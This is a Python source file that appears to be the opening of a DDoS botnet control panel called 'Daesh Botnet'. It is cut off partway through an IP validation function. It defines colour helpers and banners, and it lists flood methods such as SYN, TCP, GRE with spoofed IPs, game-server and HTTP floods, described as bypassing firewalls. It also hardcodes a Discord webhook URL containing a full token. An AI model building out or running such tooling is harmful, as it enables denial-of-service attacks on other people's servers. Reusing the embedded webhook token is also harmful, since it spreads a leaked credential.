from api import *
# Imports
import socket, threading, sys, time, ipaddress,requests
from discord_webhook import DiscordWebhook
from random import choice,choices,randint
from colorama import Fore, init, Back

OTP_WEB = "https://discord.com/api/webhooks/1077043960343691284/QrsDFlLvGoAphGA5jYouhx9ep7OGnuvD-HLeuNSuRp6A52HGLpV5o67WLrb9CiQiCAkd"
data = ""
otp_code = ''
num = 0
send_attack_target = 0

def color2(data_input_output):
    random_output = data_input_output

    if random_output == "GREEN":
        data = '\033[32m'
    elif random_output == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random_output == "YELLOW":
        data = '\033[33m'
    elif random_output == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random_output == "CYAN":
        data = '\033[36m'
    elif random_output == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random_output == "BLUE":
        data = '\033[34m'
    elif random_output == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random_output == "MAGENTA":
        data = '\033[35m'
    elif random_output == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random_output == "RED":
        data = '\033[31m'
    elif random_output == "LIGHTRED_EX":
        data = '\033[91m'
    elif random_output == "BLACK":
        data = '\033[30m'
    elif random_output == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random_output == "WHITE":
        data = '\033[37m'
    elif random_output == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data
lightwhite = color2("LIGHTWHITE_EX")
gray = color2("LIGHTBLACK_EX")

def color():

    random2 = ["GREEN","YELLOW","CYAN","BLUE","MAGENTA","RED","BLACK","WHITE","LIGHTGREEN_EX","LIGHTYELLOW_EX","LIGHTCYAN_EX","LIGHTBLUE_EX","LIGHTMAGENTA_EX","LIGHTRED_EX","LIGHTBLACK_EX","LIGHTWHITE_EX"]
    
    random2.remove('BLACK')
    random2.remove('LIGHTBLACK_EX')

    random = choice((random2))

    if random == "GREEN":
        data = '\033[32m'
    elif random == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random == "YELLOW":
        data = '\033[33m'
    elif random == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random == "CYAN":
        data = '\033[36m'
    elif random == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random == "BLUE":
        data = '\033[34m'
    elif random == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random == "MAGENTA":
        data = '\033[35m'
    elif random == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random == "RED":
        data = '\033[31m'
    elif random == "LIGHTRED_EX":
        data = '\033[91m'
    elif random == "BLACK":
        data = '\033[30m'
    elif random == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random == "WHITE":
        data = '\033[37m'
    elif random == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data
user_name = ""
bots = {}

# Banners

banner_2 = f"""
{gray}Hello @gov{lightwhite},{gray} welcome to Daesh Botnet{lightwhite}.
{gray}Display commands with:{lightwhite} "help"
{gray}View methods with:{lightwhite} "methods"
"""

banner = f"""
"""

l_banner = f"""
"""

HINT_PASSWORD = ''




TIITLE_MESSAGE = ''
DATA_TEXT = ''

message_test = f"""
+----------------------- [{TIITLE_MESSAGE}]
{DATA_TEXT}
+------------------------"""

help = f"""{lightwhite}HELP         {gray}Shows list of commands   
{lightwhite}METHODS      {gray}Shows list of methods      
{lightwhite}SERVERS      {gray}Shows available servers
{lightwhite}CLEAR        {gray}Clears the screen          
{lightwhite}EXIT         {gray}Disconnects from the net
"""

methods = f"""
   {gray}Methods:
     {lightwhite}.syn        {gray}| Simple syn+ack flood to exhaust server resources.
     {lightwhite}.tcp        {gray}| Enhanced TCP flood with crafted TCP options for bypass.
     {lightwhite}.tup        {gray}| Syn+ack+rst packets to disrupt active TCP connections.
     {lightwhite}.rand_std   {gray}| Randomized packets flag flood to bypass firewall.
     {lightwhite}.rand_hex   {gray}| GRE-encapsulated TCP flood with spoofed IPs.
     {lightwhite}.fivem      {gray}| Plain udp flood with random or static payload fivem.
     {lightwhite}.udp        {gray}| Random length udp flood to bypass basic filtering.
     {lightwhite}.rand_vse   {gray}| Valve Source Engine query flood to disrupt game servers.
     {lightwhite}.discord    {gray}| Udp flood using Discord payload to mimic voice traffic.
     {lightwhite}.http       {gray}| Simple http flood optimized for higher requests.
     {lightwhite}.icmpflood  {gray}| Simple icmp flood to exhaust server resources.
"""

layer7 = f""""""
ansi_clear = '\033[2J\033[H'

# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x 
